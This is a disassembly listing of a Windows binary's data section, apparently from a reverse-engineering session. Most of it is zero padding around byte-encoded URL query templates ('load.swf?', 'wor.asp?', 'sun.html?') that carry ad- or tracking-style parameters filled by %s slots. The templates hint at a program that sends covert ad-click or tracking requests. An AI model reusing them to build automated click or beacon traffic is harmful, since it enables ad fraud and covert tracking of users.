                db  6Fh ; o
                db  72h ; r
                db  3Dh ; =
                db  33h ; 3
                db  32h ; 2
                db  26h ; &
                db  62h ; b
                db  6Ch ; l
                db  65h ; e
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  6Ch ; l
                db  6Fh ; o
                db  63h ; c
                db  61h ; a
                db  6Ch ; l
                db  3Dh ; =
                db  79h ; y
                db  65h ; e
                db  73h ; s
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aLoadSwf        db 'load.swf?',0        ; DATA XREF: sub_404110+A3↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  73h ; s
                db  6Fh ; o
                db  72h ; r
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Eh ; n
                db  6Fh ; o
                db  72h ; r
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  65h ; e
                db  73h ; s
                db  74h ; t
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  77h ; w
                db  73h ; s
                db  74h ; t
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  70h ; p
                db  6Fh ; o
                db  6Ch ; l
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  61h ; a
                db  78h ; x
                db  69h ; i
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  74h ; t
                db  6Eh ; n
                db  3Dh ; =
                db  74h ; t
                db  65h ; e
                db  78h ; x
                db  74h ; t
                db  39h ; 9
                db  36h ; 6
                db  30h ; 0
                db  5Fh ; _
                db  39h ; 9
                db  30h ; 0
                db  26h ; &
                db  72h ; r
                db  73h ; s
                db  69h ; i
                db  31h ; 1
                db  3Dh ; =
                db  39h ; 9
                db  30h ; 0
                db  26h ; &
                db  73h ; s
                db  6Fh ; o
                db  72h ; r
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  72h ; r
                db  73h ; s
                db  69h ; i
                db  30h ; 0
                db  3Dh ; =
                db  39h ; 9
                db  36h ; 6
                db  30h ; 0
                db  26h ; &
                db  63h ; c
                db  61h ; a
                db  64h ; d
                db  3Dh ; =
                db  31h ; 1
                db  26h ; &
                db  6Eh ; n
                db  6Fh ; o
                db  72h ; r
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  61h ; a
                db  75h ; u
                db  72h ; r
                db  6Ch ; l
                db  3Dh ; =
                db  26h ; &
                db  65h ; e
                db  73h ; s
                db  74h ; t
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  66h ; f
                db  76h ; v
                db  3Dh ; =
                db  31h ; 1
                db  30h ; 0
                db  26h ; &
                db  69h ; i
                db  66h ; f
                db  3Dh ; =
                db  30h ; 0
                db  26h ; &
                db  72h ; r
                db  73h ; s
                db  73h ; s
                db  30h ; 0
                db  3Dh ; =
                db  46h ; F
                db  46h ; F
                db  46h ; F
                db  46h ; F
                db  46h ; F
                db  46h ; F
                db  26h ; &
                db  72h ; r
                db  73h ; s
                db  73h ; s
                db  31h ; 1
                db  3Dh ; =
                db  33h ; 3
                db  65h ; e
                db  31h ; 1
                db  30h ; 0
                db  39h ; 9
                db  30h ; 0
                db  30h ; 0
                db  26h ; &
                db  77h ; w
                db  73h ; s
                db  74h ; t
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  63h ; c
                db  30h ; 0
                db  31h ; 1
                db  3Dh ; =
                db  30h ; 0
                db  26h ; &
                db  74h ; t
                db  75h ; u
                db  3Dh ; =
                db  75h ; u
                db  32h ; 2
                db  39h ; 9
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aWorAsp         db 'wor.asp?',0         ; DATA XREF: sub_404110+B5↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  61h ; a
                db  63h ; c
                db  65h ; e
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  61h ; a
                db  6Dh ; m
                db  65h ; e
                db  72h ; r
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  61h ; a
                db  66h ; f
                db  63h ; c
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  65h ; e
                db  75h ; u
                db  72h ; r
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  61h ; a
                db  6Eh ; n
                db  74h ; t
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  61h ; a
                db  72h ; r
                db  63h ; c
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  63h ; c
                db  61h ; a
                db  74h ; t
                db  65h ; e
                db  67h ; g
                db  6Fh ; o
                db  72h ; r
                db  79h ; y
                db  3Dh ; =
                db  71h ; q
                db  69h ; i
                db  75h ; u
                db  26h ; &
                db  6Ah ; j
                db  6Fh ; o
                db  69h ; i
                db  6Eh ; n
                db  3Dh ; =
                db  54h ; T
                db  69h ; i
                db  74h ; t
                db  6Ch ; l
                db  65h ; e
                db  4Eh ; N
                db  61h ; a
                db  6Dh ; m
                db  65h ; e
                db  26h ; &
                db  61h ; a
                db  63h ; c
                db  65h ; e
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  6Eh ; n
                db  65h ; e
                db  77h ; w
                db  54h ; T
                db  65h ; e
                db  78h ; x
                db  74h ; t
                db  3Dh ; =
                db  26h ; &
                db  61h ; a
                db  6Dh ; m
                db  65h ; e
                db  72h ; r
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  73h ; s
                db  6Ch ; l
                db  6Fh ; o
                db  67h ; g
                db  61h ; a
                db  6Eh ; n
                db  3Dh ; =
                db  45h ; E
                db  36h ; 6
                db  42h ; B
                db  31h ; 1
                db  38h ; 8
                db  32h ; 2
                db  45h ; E
                db  38h ; 8
                db  38h ; 8
                db  31h ; 1
                db  26h ; &
                db  61h ; a
                db  66h ; f
                db  63h ; c
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  65h ; e
                db  75h ; u
                db  72h ; r
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  6Dh ; m
                db  6Dh ; m
                db  3Dh ; =
                db  6Ch ; l
                db  6Fh ; o
                db  76h ; v
                db  65h ; e
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aSunHtml        db 'sun.html?',0        ; DATA XREF: sub_404110+C7↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
